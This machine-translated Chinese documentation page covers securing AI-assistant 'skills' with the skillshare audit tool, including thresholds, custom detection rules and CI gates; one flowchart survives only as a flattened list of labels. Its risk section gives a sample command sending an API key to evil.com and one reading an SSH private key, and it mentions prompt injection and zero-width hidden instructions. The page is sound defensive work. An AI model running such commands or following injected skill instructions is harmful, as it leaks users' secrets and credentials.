# Securing Your Skills

> Source: https://skillshare.runkids.cc/docs/how-to/advanced/security

---

# 確保你的技能



人工智慧技能非常強大——它們指導人工智慧助理讀取檔案、運行命令以及與系統互動。本指南可協助您圍繞技能安裝和維護建立安全工作流程。



完整指令參考，請參閱[`audit`](https://skillshare.runkids.cc/docs/reference/commands/audit)。



## 風險：人工智慧技能供應鏈



與在沙盒運行時中運行的傳統包不同，AI 技能透過 AI 直接解釋和執行的**自然語言指令**進行操作。受損的技能可以指示人工智慧：



- 洩漏秘密(`curl https://evil.com?key=$API_KEY`)
- 讀取憑證（`cat ~/.ssh/id_rsa`）
- 透過提示注入覆蓋安全行為
- 使用零寬度 Unicode 字元隱藏惡意意圖

警告

單一惡意技能可以存取人工智慧助理可以存取的任何內容——環境變數、SSH 金鑰、雲端憑證、原始碼。自動掃描可以捕捉已知模式，但**人工審查仍然至關重要**。

詳細的威脅模型和偵測規則，請參閱【安全掃描為何如此重要】(https://skillshare.runkids.cc/docs/understand/audit-engine#why-security-scanning-matters)。



## 縱深防禦



沒有一個層可以捕獲所有內容。結合手動審查、自動掃描、自訂策略和 CI/CD 門：



|層 |工具|它有什麼作用 |
| ---| ---| ---|
|評論 |手冊|安裝前閱讀 SKILL.md — 檢查可疑指令 |
|稽核|技能共享審核|自動模式偵測（100 多個內建規則、5 個嚴重等級、6 個分析器）|
|自訂規則 |審核規則.yaml |特定於組織的模式（內部機密、許可名單）|
|持續整合/持續交付 |管道閘門|阻止引入風險技能的 PR |



### 供應鏈安全生命週期



安全檢查點取決於技能的安裝方式（`--track` 與常規安裝）：



第三階段—誠信

第 2 階段 — 更新

第一階段—安裝

常規技能

達到/高於閾值

通過/--強制

追蹤倉庫（--track）

達到/高於閾值

通過/--強制

達到/高於閾值

乾淨的

達到/高於閾值

經過

不

是的

全部匹配

不匹配

文件遺失

額外文件

Skillshare 安裝 <來源>

安裝方式

審核掃描

被封鎖（除非--force）✗

記錄在.metadata.json中
（每個文件 sha256）

安裝技能 ✓

使用 .git 克隆儲存庫

審計完整的回購協議
（相同閾值）

封鎖+清理✗
（如果自動刪除失敗則手動清理）

已安裝追蹤儲存庫 ✓
（沒有 file_hashes 元資料）

技能分享更新_repo

git拉

更新後審核
（門檻門）

復原
（CI/非 TTY 中自動）

追蹤的儲存庫已更新 ✓

技能共享更新<技能>

從來源重新安裝

安裝時審核
（門檻門）

已屏蔽✗

刷新元資料哈希

常規技能已更新 ✓

技能共享審核

file_hashes 元資料存在嗎？

已跳過哈希檢查

比較 SHA-256

乾淨 ✓

內容被竄改
（中）

內容缺失
（低）

內容意外
（低）



**關鍵設計：**



- **定期技能安裝/更新** — 驗收前運行審核；成功安裝/更新寫入`file_hashes`元數據
- **追蹤儲存庫安裝門** — 在接受之前，在整個克隆儲存庫中對新的 `--track` 安裝進行審核
- **追蹤回購更新門** - `skillshare update` `git pull` 之後審核；達到/高於閾值的結果會在非互動模式下自動觸發回滾
- **完整性驗證範圍** — `content-*` 哈希檢查僅在 `file_hashes` 元資料存在時運行



## 安全檢查表

三階段清單

**安裝前：**

- 查看來源儲存庫（明星、貢獻者、最近的活動）
- 閱讀 SKILL.md — 尋找 `curl`、`wget`、`eval`、憑證路徑
- 先試運行：`skillshare install <source> --dry-run`

**安裝後：**

- 運行`skillshare audit`並查看所有結果
- 檢查高/中結果，即使技能「通過」（預設閾值是「關鍵」）
- 定期重新審核－新規則可能會捕捉先前未偵測到的模式

**對於團隊：**

- 在配置中設定`audit.block_threshold: HIGH`
- 為組織特定的秘密模式建立自訂規則
- 將審核新增至 CI 管道以共用技能儲存庫
- 安排定期掃描（請參閱下方的定期掃描）



## 組織政策



### 區塊閾值



預設閾值僅阻止`CRITICAL`發現。對於團隊，建議採用更嚴格的閾值：



```
# ~/.config/skillshare/config.yamlaudit:  block_threshold: HIGH  # Blocks HIGH and CRITICAL findings
```



這可以捕獲混淆、破壞性命令和隱藏內容注入——這些模式在技能文件中幾乎總是惡意的。



### 自訂規則



新增特定於組織的檢測模式。常見用例：



- 內部 API 金鑰格式（`corp-api-key-*`、`internal-token-*`）
- 不允許的網域或服務
- 抑制可信任 CI 自動化的誤報



```
# ~/.config/skillshare/audit-rules.yamlrules:  - id: internal-token-leak    severity: HIGH    pattern: internal-token    message: "Internal API token pattern detected"    regex: '(?i)\b(corp-api-key|internal-token)-[A-Za-z0-9]{10,}\b'  - id: destructive-commands-2    severity: MEDIUM    pattern: destructive-commands    message: "Sudo usage (downgraded for CI automation)"    regex: '(?i)\bsudo\s+'
```



有關完整的自訂規則參考（合併語意、停用規則、排除模式），請參閱 [`audit rules` — 自訂規則](https://skillshare.runkids.cc/docs/reference/commands/audit-rules#custom-rules)。



### 定期掃描



規則不斷發展——安裝時乾淨的技能可能與後來添加的新規則相匹配。安排定期掃描：



```
# crontab: scan all skills weekly, log results0 9 * * 1 skillshare audit --json >> /var/log/skillshare-audit.json 2>&1
```



## CI/CD 整合



### 基本管道門



```
# Fail the pipeline if any skill has HIGH+ findingsskillshare audit --threshold high# Exit code: 0 = clean, 1 = findings found
```



### 現實範例：技能中心 PR 驗證



[skillshare-hub](https://github.com/runkids/skillshare-hub) 社群儲存庫使用 `skillshare audit` 來控制拉取要求。每個修改技能的 PR 都會自動掃描，審核結果會作為 PR 評論發布：



```
# .github/workflows/validate-pr.yml (simplified)name: Validate PRon:  pull_request:    paths: ['skills/**']jobs:  audit:    runs-on: ubuntu-latest    steps:      - uses: actions/checkout@v4      - uses: runkids/setup-skillshare@v1        with:          source: ./skills          audit: true          audit-threshold: high
```



完整的工作流程（包括PR評論報告和工件上傳），請參閱[validate-pr.yml來源](https://github.com/runkids/skillshare-hub/blob/main/.github/workflows/validate-pr.yml)。



更多 CI/CD 模式（SARIF 上傳、嚴格設定檔、手動設定）請參閱【CI/CD 技能驗證秘訣】(https://skillshare.runkids.cc/docs/how-to/recipes/ci-cd-skill-validation)。



## 另請參閱



- [`audit`](https://skillshare.runkids.cc/docs/reference/commands/audit) — CLI 指令參考
- [`audit rules`](https://skillshare.runkids.cc/docs/reference/commands/audit-rules) — 規則管理與客製化
- [審核引擎](https://skillshare.runkids.cc/docs/understand/audit-engine) — 引擎如何運作（威脅模型、風險評分、分層）
- [最佳實踐](https://skillshare.runkids.cc/docs/how-to/daily-tasks/best-practices) — 命名、組織和安全衛生
- [專案設定](https://skillshare.runkids.cc/docs/how-to/sharing/project-setup) — 專案範圍的技能配置